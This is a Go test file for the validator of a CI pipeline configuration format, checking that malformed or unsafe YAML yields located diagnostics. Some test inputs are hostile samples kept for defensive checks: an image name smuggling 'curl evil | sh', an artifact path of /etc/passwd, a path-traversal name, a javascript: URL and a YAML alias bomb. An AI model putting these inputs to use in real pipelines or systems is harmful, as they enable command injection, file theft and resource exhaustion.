package pipeline_test

import (
	"fmt"
	"strings"
	"testing"

	"github.com/amitpatole/renvoy/internal/diagnostics"
	"github.com/amitpatole/renvoy/internal/pipeline"
)

const minimal = `apiVersion: renvoy.dev/v1alpha1
kind: Pipeline
metadata:
  name: demo
triggers:
  push: {}
stages:
  - name: test
    jobs:
      - name: unit
        steps:
          - run: make test
`

func parse(t *testing.T, src string) (*pipeline.Pipeline, diagnostics.List) {
	t.Helper()
	p, _, diags := pipeline.Parse([]byte(src), "renvoy.yaml")
	if p != nil {
		diags = append(diags, pipeline.Validate(p, []string{"github-actions"})...)
	}
	return p, diags
}

// expectError asserts an error diagnostic exists whose message contains msg, at path when path != "".
func expectError(t *testing.T, diags diagnostics.List, path, msg string) diagnostics.Diagnostic {
	t.Helper()
	for _, d := range diags {
		if d.Severity == diagnostics.Error && strings.Contains(d.Message, msg) && (path == "" || d.Path == path) {
			return d
		}
	}
	t.Fatalf("no error at %q containing %q; got:\n%s", path, msg, render(diags))
	return diagnostics.Diagnostic{}
}

func render(diags diagnostics.List) string {
	var b strings.Builder
	_ = diagnostics.WriteText(&b, diags)
	return b.String()
}

func TestMinimalIsValid(t *testing.T) {
	p, diags := parse(t, minimal)
	if p == nil || diags.HasErrors() {
		t.Fatalf("unexpected errors:\n%s", render(diags))
	}
	if got := p.Stages[0].Jobs[0].OS(); got != pipeline.OSLinux {
		t.Errorf("default OS = %q, want linux", got)
	}
}

func TestUnknownFieldHasLocationAndSuggestion(t *testing.T) {
	src := strings.Replace(minimal, "      - name: unit\n", "      - name: unit\n        runOn: linux\n", 1)
	_, diags := parse(t, src)
	d := expectError(t, diags, "stages[0].jobs[0].runOn", `unknown field "runOn"`)
	if d.Line != 11 || d.Column != 9 {
		t.Errorf("position = %d:%d, want 11:9", d.Line, d.Column)
	}
	if d.Hint != `did you mean "runsOn"?` {
		t.Errorf("hint = %q", d.Hint)
	}
}

func TestStructuralErrors(t *testing.T) {
	cases := []struct {
		name, src, path, msg string
	}{
		{"empty", "", "", "the file is empty"},
		{"syntax", "a: [", "", "invalid YAML"},
		{"two documents", minimal + "---\na: 1\n", "", "more than one YAML document"},
		{"scalar root", "hello", "", "expected a mapping"},
		{"null trigger", strings.Replace(minimal, "push: {}", "push:", 1), "triggers.push", "found an empty value"},
		{"list for mapping", strings.Replace(minimal, "push: {}", "push: [main]", 1), "triggers.push", "expected a mapping"},
		{"mapping for string", strings.Replace(minimal, "name: demo", "name: {a: b}", 1), "metadata.name", "expected a string"},
		{"variable without value", minimal + "variables:\n  A:\n", "variables.A", "has no value"},
		{"variable list value", minimal + "variables:\n  A: [x]\n", "variables.A", "expected a string value"},
		{"matrix not list", strings.Replace(minimal, "      - name: unit\n", "      - name: unit\n        matrix:\n          py: 3\n", 1),
			"stages[0].jobs[0].matrix.py", "expected a list of values"},
		{"bad int", strings.Replace(minimal, "      - name: unit\n", "      - name: unit\n        timeoutMinutes: soon\n", 1), "", "cannot unmarshal"},
		{"duplicate key", strings.Replace(minimal, "kind: Pipeline\n", "kind: Pipeline\nkind: Pipeline\n", 1), "", "already defined"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, diags := parse(t, tc.src)
			if p != nil {
				t.Fatalf("expected structural failure")
			}
			expectError(t, diags, tc.path, tc.msg)
		})
	}
}

func TestAliasBombIsBounded(t *testing.T) {
	var b strings.Builder
	b.WriteString("a0: &a0 [x, x, x, x, x, x, x, x, x, x]\n")
	for i := 1; i < 9; i++ {
		fmt.Fprintf(&b, "a%d: &a%d [*a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d, *a%d]\n", i, i, i-1, i-1, i-1, i-1, i-1, i-1, i-1, i-1, i-1, i-1)
	}
	b.WriteString("metadata:\n  labels: *a8\n")
	p, diags := parse(t, b.String())
	if p != nil {
		t.Fatal("expected failure")
	}
	if len(diags) == 0 {
		t.Fatal("expected diagnostics")
	}
}

func TestValidationErrors(t *testing.T) {
	job := func(extra string) string {
		return strings.Replace(minimal, "        steps:\n          - run: make test\n", extra, 1)
	}
	cases := []struct {
		name, src, path, msg string
	}{
		{"api version", strings.Replace(minimal, "v1alpha1", "v9", 1), "apiVersion", "unsupported apiVersion"},
		{"kind", strings.Replace(minimal, "kind: Pipeline", "kind: Job", 1), "kind", "unsupported kind"},
		{"pipeline name", strings.Replace(minimal, "name: demo", "name: Demo_App", 1), "metadata.name", "invalid pipeline name"},
		{"path traversal name", strings.Replace(minimal, "name: demo", "name: ../../x", 1), "metadata.name", "invalid pipeline name"},
		{"no triggers", strings.Replace(minimal, "  push: {}\n", "  {}\n", 1), "", "at least one trigger"},
		{"no stages", strings.Split(minimal, "stages:")[0] + "stages: []\n", "stages", "at least one stage"},
		{"duplicate stage", minimal + "  - name: test\n    jobs:\n      - name: other\n        steps:\n          - run: x\n", "stages[1].name", "duplicate stage name"},
		{"duplicate job across stages", minimal + "  - name: two\n    jobs:\n      - name: unit\n        steps:\n          - run: x\n", "stages[1].jobs[0].name", "duplicate job name"},
		{"job named like stage", strings.Replace(minimal, "- name: unit", "- name: test", 1), "stages[0].jobs[0].name", "also a stage name"},
		{"runner", job("        runsOn: solaris\n        steps:\n          - run: x\n"), "stages[0].jobs[0].runsOn", "unknown runner"},
		{"windows container", job("        runsOn: windows\n        container:\n          image: x\n        steps:\n          - run: x\n"), "stages[0].jobs[0].container", "require a linux runner"},
		{"no steps", job("        steps: []\n"), "stages[0].jobs[0].steps", "has no steps"},
		{"empty step", job("        steps:\n          - name: nothing\n"), "stages[0].jobs[0].steps[0]", "step does nothing"},
		{"two actions", job("        steps:\n          - run: x\n            uses: checkout\n"), "stages[0].jobs[0].steps[0]", "more than one action"},
		{"undefined variable", job("        steps:\n          - run: echo ${variables.NOPE}\n"), "stages[0].jobs[0].steps[0].run", "undefined variable"},
		{"undeclared secret", job("        steps:\n          - run: echo ${secrets.TOKEN}\n"), "stages[0].jobs[0].steps[0].run", "undeclared secret"},
		{"unknown namespace", job("        steps:\n          - run: echo ${github.sha}\n"), "stages[0].jobs[0].steps[0].run", "unknown reference namespace"},
		{"unknown git ref", job("        steps:\n          - run: echo ${git.author}\n"), "stages[0].jobs[0].steps[0].run", "unknown git reference"},
		{"matrix ref without matrix", job("        steps:\n          - run: echo ${matrix.py}\n"), "stages[0].jobs[0].steps[0].run", "matrix axis this job does not define"},
		{"secret in image", strings.Replace(minimal, "triggers:", "secrets: [T]\ntriggers:", 1) + "  - name: b\n    jobs:\n      - name: img\n        steps:\n          - pushImage:\n              image: x:${secrets.T}\n",
			"stages[1].jobs[0].steps[0].pushImage.image", "not allowed here"},
		{"literal variable", minimal + "variables:\n  A: ${git.sha}\n", "variables.A", "must be literal"},
		{"reserved prefix", minimal + "variables:\n  RENVOY_X: a\n", "variables.RENVOY_X", "reserved prefix"},
		{"case collision", minimal + "variables:\n  foo: a\n  FOO: b\n", "variables.FOO", "only by case"},
		{"secret shadows variable", minimal + "variables:\n  TOKEN: a\nsecrets: [token]\n", "secrets[0]", "same name as variable"},
		{"env shadows variable", strings.Replace(job("        env:\n          IMAGE: y\n        steps:\n          - run: x\n"), "triggers:", "variables:\n  IMAGE: x\ntriggers:", 1),
			"stages[0].jobs[0].env.IMAGE", "shadows"},
		{"absolute artifact path", job("        steps:\n          - uploadArtifact:\n              name: dist\n              paths: [/etc/passwd]\n"), "stages[0].jobs[0].steps[0].uploadArtifact.paths[0]", "must be relative"},
		{"parent artifact path", job("        steps:\n          - uploadArtifact:\n              name: dist\n              paths: [../x]\n"), "stages[0].jobs[0].steps[0].uploadArtifact.paths[0]", "must not contain '..'"},
		{"wildcard artifact path", job("        steps:\n          - uploadArtifact:\n              name: dist\n              paths: [dist/*.js]\n"), "stages[0].jobs[0].steps[0].uploadArtifact.paths[0]", "wildcards"},
		{"matrix artifact", job("        matrix:\n          py: [a, b]\n        steps:\n          - uploadArtifact:\n              name: dist\n              paths: [dist/]\n"), "stages[0].jobs[0].steps[0].uploadArtifact", "matrix jobs"},
		{"shell on non-run", job("        steps:\n          - uses: checkout\n            shell: bash\n"), "stages[0].jobs[0].steps[0].shell", "only to run steps"},
		{"unknown shell", job("        steps:\n          - run: x\n            shell: fish\n"), "stages[0].jobs[0].steps[0].shell", "unknown shell"},
		{"with on run", job("        steps:\n          - run: x\n            with:\n              a: b\n"), "stages[0].jobs[0].steps[0].with", "only to uses steps"},
		{"image injection", job("        steps:\n          - pushImage:\n              image: \"x; curl evil | sh\"\n"), "stages[0].jobs[0].steps[0].pushImage.image", "not valid in an image reference"},
		{"bad event", job("        when:\n          events: [tag]\n        steps:\n          - run: x\n"), "stages[0].jobs[0].when.events[0]", "unknown event"},
		{"empty condition", job("        when: {}\n        steps:\n          - run: x\n"), "stages[0].jobs[0].when", "condition is empty"},
		{"bad pattern", strings.Replace(minimal, "push: {}", "push:\n    branches: [\"feat/*/x\"]", 1), "triggers.push.branches[0]", "unsupported pattern"},
		{"bad cron", strings.Replace(minimal, "push: {}", "schedules:\n    - cron: \"* * *\"\n      branches: [main]", 1), "triggers.schedules[0].cron", "exactly five fields"},
		{"cron range", strings.Replace(minimal, "push: {}", "schedules:\n    - cron: \"0 25 * * *\"\n      branches: [main]", 1), "triggers.schedules[0].cron", "outside 0-23"},
		{"schedule without branches", strings.Replace(minimal, "push: {}", "schedules:\n    - cron: \"0 3 * * *\"", 1), "triggers.schedules[0].branches", "must list the branches"},
		{"environment url", job("        environment:\n          name: prod\n          url: javascript:alert(1)\n        steps:\n          - run: x\n"), "stages[0].jobs[0].environment.url", "must start with https://"},
		{"matrix size", job("        matrix:\n          a: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17]\n          b: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17]\n        steps:\n          - run: x\n"), "stages[0].jobs[0].matrix", "more than 256"},
		{"unterminated ref", job("        steps:\n          - run: echo ${variables.A\n"), "stages[0].jobs[0].steps[0].run", "unterminated reference"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, diags := parse(t, tc.src)
			expectError(t, diags, tc.path, tc.msg)
		})
	}
}

func TestUnknownExtensionWarns(t *testing.T) {
	_, diags := parse(t, minimal+"extensions:\n  circleci: {}\n")
	if diags.HasErrors() {
		t.Fatalf("unexpected errors:\n%s", render(diags))
	}
	found := false
	for _, d := range diags {
		if d.Severity == diagnostics.Warning && d.Path == "extensions.circleci" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected a warning for the unknown namespace:\n%s", render(diags))
	}
}

func TestEnvironmentShorthand(t *testing.T) {
	src := strings.Replace(minimal, "      - name: unit\n", "      - name: unit\n        environment: staging\n", 1)
	p, diags := parse(t, src)
	if diags.HasErrors() {
		t.Fatal(render(diags))
	}
	if got := p.Stages[0].Jobs[0].Environment.Name; got != "staging" {
		t.Errorf("environment = %q", got)
	}
}

func TestOrderedMappingsKeepOrder(t *testing.T) {
	p, diags := parse(t, minimal+"variables:\n  ZED: 1\n  ALPHA: 2\n  MID: \"3\"\n")
	if diags.HasErrors() {
		t.Fatal(render(diags))
	}
	var names []string
	for _, v := range p.Variables {
		names = append(names, v.Name+"="+v.Value)
	}
	if got := strings.Join(names, ","); got != "ZED=1,ALPHA=2,MID=3" {
		t.Errorf("order = %s", got)
	}
}

func TestTemplates(t *testing.T) {
	cases := []struct {
		in   string
		want string // literal segments as-is, refs as <ns.name>
		err  string
	}{
		{"plain $HOME and ${HOME}", "plain $HOME and ${HOME}", ""},
		{"${variables.IMAGE}:${git.sha}", "<variables.IMAGE>:<git.sha>", ""},
		{"escaped $${variables.X}", "escaped ${variables.X}", ""},
		{"${matrix.python}", "<matrix.python>", ""},
		{"awk '{print $1}'", "awk '{print $1}'", ""},
		{"${foo.bar}", "", "unknown reference namespace"},
		{"${variables.}", "", "invalid reference name"},
		{"${variables.A", "", "unterminated"},
		{"trailing ${", "trailing ${", ""},
	}
	for _, tc := range cases {
		got, err := pipeline.ParseTemplate(tc.in)
		if tc.err != "" {
			if err == nil || !strings.Contains(err.Error(), tc.err) {
				t.Errorf("%q: error = %v, want %q", tc.in, err, tc.err)
			}
			continue
		}
		if err != nil {
			t.Errorf("%q: %v", tc.in, err)
			continue
		}
		var b strings.Builder
		for _, s := range got {
			if s.Ref != nil {
				b.WriteString("<" + s.Ref.Namespace + "." + s.Ref.Name + ">")
			} else {
				b.WriteString(s.Literal)
			}
		}
		if b.String() != tc.want {
			t.Errorf("%q: got %q, want %q", tc.in, b.String(), tc.want)
		}
	}
}

func TestSourceMapFallsBackToAncestor(t *testing.T) {
	_, sm, _ := pipeline.Parse([]byte(minimal), "renvoy.yaml")
	pos, ok := sm.Lookup("stages[0].jobs[0].environment.approvals")
	if !ok || pos.Line != 10 {
		t.Fatalf("lookup = %+v %v, want line 10 (the job)", pos, ok)
	}
}

func TestMatrixCombinations(t *testing.T) {
	m := pipeline.Matrix{{Name: "os", Values: []string{"a", "b"}}, {Name: "py", Values: []string{"1", "2", "3"}}}
	combos := m.Combinations()
	if len(combos) != 6 || strings.Join(combos[5], "/") != "b/3" || strings.Join(combos[1], "/") != "a/2" {
		t.Fatalf("combinations = %v", combos)
	}
}
